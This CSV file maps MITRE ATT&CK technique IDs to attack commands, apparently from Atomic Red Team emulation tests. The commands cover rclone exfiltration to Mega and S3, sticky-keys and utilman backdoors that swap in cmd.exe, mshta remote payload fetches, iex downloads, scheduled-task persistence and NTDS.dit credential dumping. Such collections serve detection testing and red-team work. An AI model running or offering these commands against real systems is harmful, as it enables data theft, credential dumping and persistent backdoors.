mitre_id,technique_name,command
T1567,Exfiltrate data with rclone to cloud Storage - Mega (Windows),"new-item #{rclone_config_path}\rclone -itemtype directory new-item #{rclone_config_path}\rclone\rclone.conf cd ""#{rclone_path}"" .\rclone.exe config create #{remote_share} mega set-content #{rclone_config_path}\rclone\rclone.conf ""[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}"" .\rclone.exe copy --max-size 1700k ""#{dir_to_copy}"" #{remote_share}:test -v"
T1567,Exfiltrate data with rclone to cloud Storage - AWS S3,"write-host ""deploying aws infrastructure... "" -nonewline $awsaccesskey = ""#{aws_access_key}"" $awssecretkey = ""#{aws_secret_key}"" cd pathtoatomicsfolder/t1567.002/src/ if ($awsaccesskey -eq """" -or $awssecretkey -eq """") { $env:aws_profile = ""#{aws_profile}"" } else { $env:aws_access_key_id = ""$awsaccesskey"" $env:aws_secret_access_key = ""$awssecretkey"" } $null = pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform init $null = pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform apply -var ""aws_region=#{aws_region}"" -auto-approve write-host ""done!"" write-host ""generating rclone config... "" -nonewline $config = @"" [exfils3] type = s3 provider = aws env_auth = true region = #{aws_region} ""@ $config | out-file -filepath ""pathtoatomicsfolder/../externalpayloads/t1567.002/rclone.conf"" -encoding ascii write-host ""done!"" write-host ""exfiltrating data... "" -nonewline $bucket = ""$(pathtoatomicsfolder/../externalpayloads/t1567.002/terraform-v*/terraform output bucket)"".replace(""`"""","""") cd pathtoatomicsfolder/../externalpayloads/t1567.002/rclone-v* $null = ./rclone copy --max-size 1700k ""pathtoatomicsfolder/../externalpayloads/t1567.002/data/"" exfils3:$bucket --config ""pathtoatomicsfolder/../externalpayloads/t1567.002/rclone.conf"" write-host ""done!"""
T1614,Get geolocation info through IP-Lookup services using curl Windows,#{curl_path} -k #{ip_lookup_url}
T1614,"Get geolocation info through IP-Lookup services using curl freebsd, linux or macos",curl -k #{ip_lookup_url}
T1546,Attaches Command Prompt as a Debugger to a List of Target Processes,"$input_table = ""#{parent_list}"".split("","") $name = ""debugger"" $value = ""#{attached_process}"" foreach ($item in $input_table){ $item = $item.trim() $registrypath = ""hklm:\software\microsoft\windows nt\currentversion\image file execution options\$item"" if(!(test-path $registrypath)) { new-item -path $registrypath -force new-itemproperty -path $registrypath -name $name -value $value -propertytype string -force } else { new-itemproperty -path $registrypath -name $name -value $value } }"
T1546,Replace binary of sticky keys,if not exist c:\windows\system32\sethc_backup.exe (copy c:\windows\system32\sethc.exe c:\windows\system32\sethc_backup.exe) else ( pushd ) takeown /f c:\windows\system32\sethc.exe /a icacls c:\windows\system32\sethc.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
T1546,Create Symbolic Link From osk.exe to cmd.exe,if not exist %windir%\system32\osk.exe.bak (copy %windir%\system32\osk.exe %windir%\system32\osk.exe.bak) else ( pushd ) takeown /f %windir%\system32\osk.exe /a icacls %windir%\system32\osk.exe /grant administrators:f /t del %windir%\system32\osk.exe mklink %windir%\system32\osk.exe %windir%\system32\cmd.exe
T1546,Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v terminateondesktopswitch /t reg_dword /d 0 /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v startexe /t reg_sz /d c:\windows\system32\cmd.exe /f atbroker /start malware_test"
T1546,Auto-start application on user logon,"reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v terminateondesktopswitch /t reg_dword /d 0 /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v startexe /t reg_sz /d c:\windows\system32\cmd.exe /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats"" /v configuration /t reg_sz /d malware_test /f"
T1546,Replace utilman.exe (Ease of Access Binary) with cmd.exe,if not exist c:\windows\system32\utilman_backup.exe (copy c:\windows\system32\utilman.exe c:\windows\system32\utilman_backup.exe) else ( pushd ) takeown /f c:\windows\system32\utilman.exe /a icacls c:\windows\system32\utilman.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
T1546,Replace Magnify.exe (Magnifier binary) with cmd.exe,if not exist c:\windows\system32\magnify_backup.exe (copy c:\windows\system32\magnify.exe c:\windows\system32\magnify_backup.exe) else ( pushd ) takeown /f c:\windows\system32\magnify.exe /a icacls c:\windows\system32\magnify.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\magnify.exe
T1546,Replace Narrator.exe (Narrator binary) with cmd.exe,if not exist c:\windows\system32\narrator_backup.exe (copy c:\windows\system32\narrator.exe c:\windows\system32\narrator_backup.exe) else ( pushd ) takeown /f c:\windows\system32\narrator.exe /a icacls c:\windows\system32\narrator.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\narrator.exe
T1546,Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe,if not exist c:\windows\system32\displayswitch_backup.exe (copy c:\windows\system32\displayswitch.exe c:\windows\system32\displayswitch_backup.exe) else ( pushd ) takeown /f c:\windows\system32\displayswitch.exe /a icacls c:\windows\system32\displayswitch.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\displayswitch.exe
T1546,Replace AtBroker.exe (App Switcher binary) with cmd.exe,if not exist c:\windows\system32\atbroker_backup.exe (copy c:\windows\system32\atbroker.exe c:\windows\system32\atbroker_backup.exe) else ( pushd ) takeown /f c:\windows\system32\atbroker.exe /a icacls c:\windows\system32\atbroker.exe /grant administrators:f /t copy /y c:\windows\system32\cmd.exe c:\windows\system32\atbroker.exe
T1622,Detect a Debugger Presence in the Machine,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1610,Deploy Docker container,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
T1110,Password Cracking with Hashcat,cd #{hashcat_exe}\.. #{hashcat_exe} -a 0 -m 1000 -r .\rules\incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}
T1218,Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject,mshta.exe javascript:a=(getobject('script:#{file_url}')).exec();close();
T1218,Mshta executes VBScript to execute malicious command,"mshta vbscript:execute(""createobject(""""wscript.shell"""").run """"powershell -noexit -file pathtoatomicsfolder\t1218.005\src\powershell.ps1"""":close"")"
T1218,Mshta Executes Remote HTML Application (HTA),"$var =invoke-webrequest ""#{hta_url}"" $var.content|out-file ""#{temp_file}"" mshta ""#{temp_file}"" start-sleep -s 15 stop-process -name ""calculator"" -force -erroraction ignore stop-process -name ""calculatorapp"" -force -erroraction ignore"
T1218,Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,invoke-athhtmlapplication -htafilepath #{hta_file_path} -scriptengine #{script_engine} -aslocaluncpath -simulatelateralmovement -mshtafilepath #{mshta_file_path}
T1218,Invoke HTML Application - Jscript Engine Simulating Double Click,invoke-athhtmlapplication -htafilepath #{hta_file_path} -scriptengine #{script_engine} -simulateuserdoubleclick
T1218,Invoke HTML Application - Direct download from URI,invoke-athhtmlapplication -htauri #{hta_uri} -mshtafilepath #{mshta_file_path}
T1218,Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,invoke-athhtmlapplication -scriptengine #{script_engine} -inlineprotocolhandler #{protocol_handler} -userundll32 -rundll32filepath #{rundll32_file_path}
T1218,Invoke HTML Application - JScript Engine with Inline Protocol Handler,invoke-athhtmlapplication -scriptengine #{script_engine} -inlineprotocolhandler #{protocol_handler} -mshtafilepath #{mshta_file_path}
T1218,Invoke HTML Application - Simulate Lateral Movement over UNC Path,invoke-athhtmlapplication -templatepe -aslocaluncpath -mshtafilepath #{mshta_file_path}
T1218,Mshta used to Execute PowerShell,"mshta.exe ""about:<hta:application><script language=""vbscript"">close(execute(""createobject(""""wscript.shell"""").run%20""""powershell.exe%20-nop%20-command%20write-host%20#{message};start-sleep%20-seconds%20#{seconds_to_sleep}""""""))</script>'"""
T1542,UEFI Persistence via Wpbbin.exe File Creation,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1053,Scheduled Task Startup Script,"schtasks /create /tn ""t1053_005_onlogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" schtasks /create /tn ""t1053_005_onstartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe"""
T1053,Scheduled task Local,schtasks /create /sc once /tn spawn /tr #{task_command} /st #{time}
T1053,Scheduled task Remote,"schtasks /create /s #{target} /ru #{user_name} /rp #{password} /tn ""atomic task"" /tr ""#{task_command}"" /sc daily /st #{time}"
T1053,Powershell Cmdlet Scheduled Task,"$action = new-scheduledtaskaction -execute ""calc.exe"" $trigger = new-scheduledtasktrigger -atlogon $user = new-scheduledtaskprincipal -groupid ""builtin\administrators"" -runlevel highest $set = new-scheduledtasksettingsset $object = new-scheduledtask -action $action -principal $user -trigger $trigger -settings $set register-scheduledtask atomictask -inputobject $object"
T1053,Task Scheduler via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1053.005\src\t1053.005-macrocode.txt"" -officeproduct ""#{ms_product}"" -sub ""scheduler"""
T1053,WMI Invoke-CimMethod Scheduled Task,"$xml = [system.io.file]::readalltext(""#{xml_path}"") invoke-cimmethod -classname ps_scheduledtask -namespace ""root\microsoft\windows\taskscheduler"" -methodname ""registerbyxml"" -arguments @{ force = $true; xml =$xml; }"
T1053,Scheduled Task Executing Base64 Encoded Commands From Registry,"reg add hkcu\software\atomic-t1053.005 /v test /t reg_sz /d cgluzyaxmjcumc4wlje= /f schtasks.exe /create /f /tn ""atomic-t1053.005"" /tr ""cmd /c start /min \""\"" powershell.exe -command iex([system.text.encoding]::ascii.getstring([system.convert]::frombase64string((get-itemproperty -path hkcu:\\software\\atomic-t1053.005).test)))"" /sc daily /st #{time}"
T1053,Import XML Schedule Task with Hidden Attribute,"$xml = [system.io.file]::readalltext(""#{xml_path}"") invoke-cimmethod -classname ps_scheduledtask -namespace ""root\microsoft\windows\taskscheduler"" -methodname ""registerbyxml"" -arguments @{ force = $true; xml =$xml; }"
T1053,PowerShell Modify A Scheduled Task,"$action = new-scheduledtaskaction -execute ""cmd.exe"" $trigger = new-scheduledtasktrigger -atlogon $user = new-scheduledtaskprincipal -groupid ""builtin\administrators"" -runlevel highest $set = new-scheduledtasksettingsset $object = new-scheduledtask -action $action -principal $user -trigger $trigger -settings $set register-scheduledtask atomictaskmodifed -inputobject $object $newaction = new-scheduledtaskaction -execute ""notepad.exe"" set-scheduledtask ""atomictaskmodifed"" -action $newaction"
T1053,"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\#{target} -accepteula -s ""cmd.exe"" ""pathtoatomicsfolder\..\externalpayloads\ghosttask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon"
T1053,Scheduled Task Persistence via CompMgmt.msc,"reg add ""hkey_current_user\software\classes\mscfile\shell\open\command"" /ve /t reg_expand_sz /d ""c:\windows\system32\#{payload}"" /f schtasks /create /tn ""#{task_name}"" /tr ""compmgmt.msc"" /sc onlogon /rl highest /f echo let's open the computer management console now... compmgmt.msc"
T1053,Scheduled Task Persistence via Eventviewer.msc,"reg add ""hkey_current_user\software\classes\mscfile\shell\open\command"" /ve /t reg_expand_sz /d ""c:\windows\system32\#{payload}"" /f schtasks /create /tn ""#{task_name}"" /tr ""eventvwr.msc"" /sc onlogon /rl highest /f echo let's run the schedule task ... schtasks /run /tn ""eventviewerbypass"""
T1003,Create Volume Shadow Copy with vssadmin,vssadmin.exe create shadow /for=#{drive_letter}
T1003,Copy NTDS.dit from Volume Shadow Copy,copy #{vsc_name}\windows\ntds\ntds.dit #{extract_path}\ntds.dit copy #{vsc_name}\windows\system32\config\system #{extract_path}\vsc_system_hive reg save hklm\system #{extract_path}\system_hive
T1003,Dump Active Directory Database with NTDSUtil,"mkdir #{output_folder} ntdsutil ""ac i ntds"" ""ifm"" ""create full #{output_folder}"" q q"
T1003,Create Volume Shadow Copy with WMI,wmic shadowcopy call create volume=#{drive_letter}
T1003,Create Volume Shadow Copy remotely with WMI,"wmic /node:""#{target_host}"" shadowcopy call create volume=#{drive_letter}"
T1003,Create Volume Shadow Copy remotely (WMI) with esentutl,"wmic /node:""#{target_host}"" process call create ""cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"""
T1003,Create Volume Shadow Copy with Powershell,"(gwmi -list win32_shadowcopy).create('#{drive_letter}','clientaccessible')"
